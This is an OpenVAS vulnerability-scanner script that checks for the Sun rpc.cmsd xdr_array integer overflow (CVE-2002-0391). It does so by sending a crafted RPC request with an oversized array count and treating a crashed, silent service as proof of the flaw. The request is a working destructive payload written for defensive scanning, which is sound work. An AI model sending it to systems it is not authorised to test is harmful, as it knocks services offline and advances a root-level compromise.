###############################################################################
# OpenVAS Vulnerability Test
# $Id: rpc_cmsd_overflow.nasl 12057 2018-10-24 12:23:19Z cfischer $
#
# Sun rpc.cmsd overflow
#
# Authors:
# Xue Yong Zhi <xueyong@udel.edu>
#
# Copyright:
# Copyright (C) 2003 Xue Yong Zhi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# This script was written by Xue Yong Zhi <xueyong@udel.edu>

# Data structure of cms_create_args(maybe wrong)
# struct cms_pid_t {
#	long pid;
# };
# struct cms_create_args {
#	char *str1;
#	char *str2;
#	struct cms_pid_t mypid;
#	struct {
#		u_int myarray_len;
#		long *myarray_val;
#	} myarray;
# };
#
# Successfully tested against Solaris 8

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11418");
  script_version("$Revision: 12057 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-24 14:23:19 +0200 (Wed, 24 Oct 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(5356);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2002-0391");
  script_name("Sun rpc.cmsd overflow");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("This script is Copyright (C) 2003 Xue Yong Zhi");
  script_family("RPC");
  script_dependencies("secpod_rpc_portmap_tcp.nasl");
  script_require_keys("rpc/portmap");

  script_tag(name:"solution", value:"We suggest that you disable this service and apply a new patch.");

  script_tag(name:"summary", value:"The remote Sun rpc.cmsd has integer overflow problem in xdr_array. An attacker
  may use this flaw to execute arbitrary code on this host with the privileges rpc.cmsd is running as (typically, root),
  by sending a specially crafted request to this service.");

  script_tag(name:"solution_type", value:"Mitigation");
  script_tag(name:"qod_type", value:"remote_vul"); # rpc.cmsd is started from inetd

  exit(0);
}

include("misc_func.inc");
include("nfs_func.inc");
include("byte_func.inc");

RPC_PROG = 100068;
tcp = 0;
port = get_rpc_port(program:RPC_PROG, protocol:IPPROTO_UDP);
if(!port){
  port = get_rpc_port(program:RPC_PROG, protocol:IPPROTO_TCP);
  tcp = 1;
}

if(port) {
  if(tcp) {
    soc = open_sock_tcp(port);
  } else {
    soc = open_sock_udp(port);
  }

  pad = padsz(len:strlen(this_host_name()));
  len = 20 + strlen(this_host_name()) + pad;

  # nb: First, make sure there is a RPC service running behind, so we send a bogus request to get an error back
  req1 = rpclong(val:rand()) +
         rpclong(val:0) +
         rpclong(val:2) +
         rpclong(val:100070) +
         rpclong(val:4) +
         rpclong(val:21);

  send(socket:soc, data:req1);
  r = recv(socket:soc, length:4096);
  close(soc);
  if(!r)exit(0);

  if(tcp) {
    soc = open_sock_tcp(port);
  } else {
    soc = open_sock_udp(port);
  }


  req = rpclong(val:rand()) +   	#unsigned int xid;
        rpclong(val:0) +      		#msg_type mtype case CALL(0):
        rpclong(val:2) +      		#unsigned int rpcvers;/* must be equal to two (2) */
        rpclong(val:100068) + 		#unsigned int prog(CMSD);
        rpclong(val:4) +      		#unsigned int vers(4);
        rpclong(val:21) +      		#unsigned int proc(rtable_create_4);
        rpclong(val:1) +      		#AUTH_UNIX
        rpclong(val:len) +    		#len
        rpclong(val:rand()) + 		#stamp
        rpclong(val:strlen(this_host_name())) + #length
        this_host_name() +            	#contents(Machine name)
        rpcpad(pad:pad) +     		#fill bytes
        rpclong(val:0)  +     		#uid
        rpclong(val:0)  +     		#gid
        rpclong(val:0)  +     		#auxiliary gids
        rpclong(val:0)  +     		#AUTH_NULL
        rpclong(val:0)  +		#len
        rpclong(val:1)  +		#strlen of str1
        rpclong(val:67)  +		#str1
        rpclong(val:1)  +		#strlen of str2
        rpclong(val:67)  +		#str2
        rpclong(val:0)  + 		#pid
        rpclong(val:1073741825) +	#array size
        rpclong(val:0)  +		#content of array(this one and below)
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0)  +
        rpclong(val:0);

  send(socket:soc, data:req);
  r = recv(socket:soc, length:4096);
  if(!r) {
    security_message(port:port);
  }
}